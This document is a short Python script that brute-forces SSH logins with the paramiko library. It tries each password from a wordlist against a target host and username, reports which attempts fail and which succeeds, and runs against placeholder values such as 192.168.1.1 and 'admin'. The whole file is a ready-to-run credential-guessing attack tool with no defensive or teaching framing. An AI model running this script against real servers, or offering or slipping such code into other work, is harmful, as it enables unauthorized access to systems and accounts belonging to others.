import paramiko
import socket

def ssh_brute_force(target, username, wordlist):
    """Attempt brute-forcing SSH login."""
    for password in wordlist:
        try:
            # Create an SSH client instance
            ssh = paramiko.SSHClient()
            
            # Automatically add the server's host key (unsafe in production, use proper key management in production)
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Try to connect to the SSH server with the provided username and password
            print(f"Attempting {username}:{password} on {target}...")
            ssh.connect(target, username=username, password=password, timeout=5)
            print(f"Successful login: {username}:{password}")
            ssh.close()  # Close the connection after successful login
            return  # Exit after a successful login
        
        except paramiko.AuthenticationException:
            # Incorrect password, move to the next one
            print(f"Failed login attempt for {username}:{password}")
            continue
        
        except socket.timeout:
            # Connection timed out
            print(f"Connection to {target} timed out. Skipping...")
            break  # Exit the loop if connection timed out

        except Exception as e:
            # Catch all other exceptions (e.g., connection issues, invalid target, etc.)
            print(f"Error: {e}")
            break  # Exit on any error

    print("Brute force attack finished.")

if __name__ == "__main__":
    # Test parameters
    target_ip = "192.168.1.1"  # Replace with your target IP address
    username = "admin"  # Replace with the username you're trying
    wordlist = ["1234", "admin", "password", "letmein"]  # List of passwords to try
    
    # Run the brute force function
    ssh_brute_force(target_ip, username, wordlist)
